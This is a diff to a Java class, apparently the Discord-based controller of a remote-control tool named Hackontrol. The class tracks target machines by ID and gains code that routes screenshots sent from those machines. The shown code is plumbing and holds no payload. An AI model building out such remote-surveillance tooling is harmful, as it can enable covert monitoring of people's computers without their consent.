@@ -1,6 +1,7 @@
 package com.khopan.hackontrol;
 
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.List;
 
 import com.fasterxml.jackson.databind.node.ObjectNode;
@@ -13,6 +14,8 @@ import com.khopan.hackontrol.target.TargetListener;
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Guild;
+import net.dv8tion.jda.api.entities.Message;
+import net.dv8tion.jda.api.entities.Message.Attachment;
 import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
@@ -23,8 +26,9 @@ public class Hackontrol {
 	private final Guild guild;
 	private final TextChannel channel;
 	private final List<Target> targetList;
-	private final Request request;
 	private final Response response;
+
+	final Request request;
 
 	private TargetListener listener;
 
@@ -72,6 +76,10 @@ public class Hackontrol {
 		this.listener = listener;
 	}
 
+	public List<Target> getActiveTargets() {
+		return Collections.unmodifiableList(this.targetList);
+	}
+
 	void statusReport(MachineId identifier, ObjectNode node) {
 		boolean online = false;
 
@@ -95,6 +103,16 @@ public class Hackontrol {
 		this.removeTarget(identifier);
 	}
 
+	void screenshotTaken(MachineId identifier, Attachment attachment) {
+		Target target = this.getTarget(identifier);
+
+		if(target == null) {
+			return;
+		}
+
+		target.screenshotTaken(attachment);
+	}
+
 	private boolean hasIdentifier(MachineId identifier) {
 		for(int i = 0; i < this.targetList.size(); i++) {
 			Target target = this.targetList.get(i);
@@ -108,7 +126,7 @@ public class Hackontrol {
 	}
 
 	private void spawnTarget(MachineId identifier) {
-		Target target = new Target(identifier);
+		Target target = new Target(this, identifier);
 		this.targetList.add(target);
 
 		if(this.listener != null) {
@@ -133,11 +151,24 @@ public class Hackontrol {
 		}
 	}
 
+	private Target getTarget(MachineId identifier) {
+		for(int i = 0; i < this.targetList.size(); i++) {
+			Target target = this.targetList.get(i);
+
+			if(target.getMachineIdentifier().equals(identifier)) {
+				return target;
+			}
+		}
+
+		return null;
+	}
+
 	private class Listener extends ListenerAdapter {
 		@Override
 		public void onMessageReceived(MessageReceivedEvent Event) {
-			String message = Event.getMessage().getContentDisplay();
-			Hackontrol.this.response.parse(message);
+			Message message = Event.getMessage();
+			String text = message.getContentDisplay();
+			Hackontrol.this.response.parse(text, message.getAttachments());
 		}
 	}
 }
